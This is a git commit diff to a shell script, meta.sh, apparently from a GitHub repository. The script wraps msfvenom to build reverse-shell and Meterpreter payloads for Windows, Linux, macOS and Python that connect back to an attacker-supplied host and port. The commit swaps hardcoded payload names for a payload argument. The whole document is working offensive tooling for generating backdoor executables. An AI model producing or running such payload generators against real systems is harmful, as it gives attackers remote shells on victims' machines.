4b1b8864d124f08cc96d0cb9db88abbb32bbcdcd
str1ke007 <73118143+str1ke007@users.noreply.github.com>
2022-08-07 00:07:23 +0530

    Update meta.sh

--- meta.sh
+++ meta.sh
@@ -4,6 +4,7 @@
 # $2 -> Port
 # $3 -> options
 # $4 -> Arch
+# $5 -> Payload
 
 ARCH="-"
 if [ $4 -eq 1 ]
@@ -16,25 +17,14 @@ fi
 if [ $3 -eq 1 ]
 then
 	# Windows
-	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 --arch $ARCH -f exe > reverse.exe
+	msfvenom -p $5 LHOST=$1 LPORT=$2 --arch x86 -f exe > reverse.exe
 elif [ $3 -eq 2 ]
 then
-	if [ $4 -eq 1 ]
-	then
-		# Linux (x64)
-		msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$2 --arch $ARCH -f elf > shell.elf
-	else
-		# Linux (x86)
-		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 --arch $ARCH -f elf > reverse.elf
-	fi
+	msfvenom -p $5 LHOST=$1 LPORT=$2 -f elf > reverse.elf
 elif [ $3 -eq 3 ]
 then
-	# MAC os
-	msfvenom -p osx/x86/shell_reverse_tcp LHOST=$1 LPORT=$2 -f macho > reverse.macho
-elif [ $3 -eq 4 ]
-then
 	# Script Based (Python)
-	msfvenom -p cmd/unix/reverse_python LHOST=$1 LPORT=$2 -f raw > reverse.py
+	msfvenom -p $5 LHOST=$1 LPORT=$2 --arch $ARCH -f raw > reverse.py
 else
-	echo "[-] Invalid Input!"
+	echo "[-] Fatal Error!"
 fi
